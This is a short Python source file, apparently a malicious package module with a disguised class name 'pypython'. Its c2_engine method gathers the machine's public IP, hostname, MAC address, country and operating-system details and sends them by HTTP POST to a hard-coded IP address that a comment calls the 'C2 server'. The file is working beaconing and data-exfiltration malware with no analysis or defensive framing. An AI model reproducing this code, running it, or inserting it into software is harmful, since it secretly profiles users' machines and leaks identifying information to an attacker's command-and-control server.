import time
import os
import sys
import requests
import socket
import uuid
import platform
import json
from datetime import datetime


def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        return response.text
    except Exception as e:
        return "Unknown"

def get_country():
    try:
        response = requests.get("https://api.country.is", timeout=5)
        data = response.json()
        return data.get('country', 'Unknown')
    except Exception as e:
        return 'Unknown'

def get_mac():
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                            for ele in range(0,8*6,8)][::-1])
        return mac_address
    except Exception as e:
        return "Unknown"

def get_computer_name():
    try:
        return platform.node()
    except Exception as e:
        return "Unknown"

def get_system_info():
    try:
        return {
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor()
        }
    except Exception as e:
        return {}

class pypython:
    @staticmethod
    def c2_engine():
        try:
            # Collect all system information
            data = {
                "public_ip": get_public_ip(),
                "computer_name": get_computer_name(),
                "mac_address": get_mac(),
                "country": get_country(),
                "system_info": get_system_info()
            }
            
            # Send data to C2 server
            response = requests.post(
                "http://165.227.81.186:5000/submit",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                return 'Success'
            else:
                return 'Failed'
                
        except requests.exceptions.RequestException as e:
            return 'Network Error'
        except Exception as e:
            return 'Unknown' 